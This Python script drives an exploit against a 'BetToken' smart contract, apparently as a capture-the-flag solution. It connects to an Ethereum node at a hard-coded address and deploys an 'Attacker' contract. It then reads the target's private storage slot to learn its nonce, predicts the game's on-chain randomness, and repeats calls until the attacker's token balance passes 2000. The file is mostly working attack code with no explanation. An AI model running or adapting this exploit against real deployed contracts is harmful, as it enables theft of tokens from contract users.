from web3 import Web3
from web3.middleware import geth_poa_middleware
import json, os, sys, time
from Crypto.Util.number import bytes_to_long

force = '-f' in sys.argv

def compile_sol(name):
    path = name + '.sol'
    cache_path = name + '.cache.json'
    if not force and os.path.isfile(cache_path) and os.stat(path).st_mtime < os.stat(cache_path).st_mtime:
        return json.load(open(cache_path))
    os.system(f'solc --abi --bin {path} -o build --optimize --optimize-runs 10000 --overwrite')
    bytecode = open(f'build/{name}.bin').read()
    abi = json.load(open(f'build/{name}.abi'))
    ret = (bytecode, abi)
    json.dump(ret, open(cache_path, 'w'))
    return ret

# connect to server
w3 = Web3(Web3.HTTPProvider('http://123.60.36.208:8545'))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

# unlock account
acct = w3.eth.account.create()
print('account:', acct.address)
print("pay money into it")
input()
# see balance
print('Balance:', w3.eth.get_balance(acct.address))

# constant
ADDITIONAL_GAS_LIMIT = 100000

nonceId = w3.eth.getTransactionCount(acct.address)


def sendRawTrans(caller):
    global nonceId
    gas = caller.estimateGas({
        'from': acct.address,
    })
    print('gas:', gas)
    txn = caller.buildTransaction({
        'from': acct.address,
        'nonce': nonceId,
        'gas': gas + ADDITIONAL_GAS_LIMIT,
        'gasPrice': w3.toWei(1, 'gwei')
    })
    nonceId += 1
    signed = acct.signTransaction(txn)
    return w3.eth.sendRawTransaction(signed.rawTransaction)

# depoly contract
def depoly(name, *args):
    bytecode, abi = compile_sol(name)
    option = {'from': acct.address}
    Creation = w3.eth.contract(abi=abi, bytecode=bytecode)
    callee = Creation.constructor(*args)
    option['gas'] = callee.estimateGas(option) + ADDITIONAL_GAS_LIMIT
    tx_hash = sendRawTrans(callee)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f'{name} contract address:', tx_receipt.contractAddress)
    contract = w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
    contract_address = tx_receipt.contractAddress
    return bytecode, abi, contract, contract_address

_, BetToken_abi = compile_sol('BetToken')

# _, _, _, Game_contract_address = depoly('Game')

BetToken_contract_address = Web3.toChecksumAddress(input('address of contract: '))
BetToken = w3.eth.contract(address=BetToken_contract_address, abi=BetToken_abi)

_, _, Attacker, Attacker_contract_address = depoly('Attacker', BetToken_contract_address)

def lar(callee):
    while True:
        try:
            print('local:', callee.call())
            break
        except:
            time.sleep(1)
            continue
    tx_hash = sendRawTrans(callee)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print('remote', tx_receipt['status'])
    time.sleep(1)

lar(Attacker.functions.doAirDrop())
lar(Attacker.functions.setNonce(bytes_to_long(w3.eth.getStorageAt(BetToken_contract_address, 2))))
print(Attacker.functions.pick().call())
print(BetToken.functions.balances(Attacker.functions.pick().call()).call())
while BetToken.functions.balances(Attacker.functions.pick().call()).call() <= 2000:
    lar(Attacker.functions.doNextTick())
    print(Attacker.functions.pick().call())
    print(BetToken.functions.balances(Attacker.functions.pick().call()).call())


print('pick:', Attacker.functions.pick().call())